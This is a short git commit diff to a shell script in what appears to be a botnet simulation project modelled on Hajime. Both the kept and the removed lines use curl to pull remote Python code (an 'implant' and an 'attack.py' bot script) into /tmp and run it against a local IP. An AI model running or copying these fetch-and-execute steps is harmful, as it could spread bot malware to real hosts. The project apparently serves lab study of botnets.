012ea09c95ce42e7cc59da7c93e50b64142bceea
rhishi <rhishi.16@gmail.com>
2019-12-31 18:10:23 +0800

    Minor changes.

--- hajime_node/hajime.sh
+++ hajime_node/hajime.sh
@@ -9,13 +9,3 @@ else
     /usr/bin/curl -LO GET https://github.com/dcsrps/botnet_sim/blob/master/hajime_node/implant/implant.zip?raw=true > /tmp/implant.zip
     python3 /tmp/implant.zip 192.168.1.48 &
 fi
-
-ps ax | grep "attack.py" | grep -v grep;
-if test $? -eq 0; 
-then 
-    echo "Process already running."
-else 
-    echo "Starting process."
-    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/hajime_node/others/init_bot.py > /tmp/attack.py
-    python3 /tmp/attack.py 192.168.1.48 &
-fi
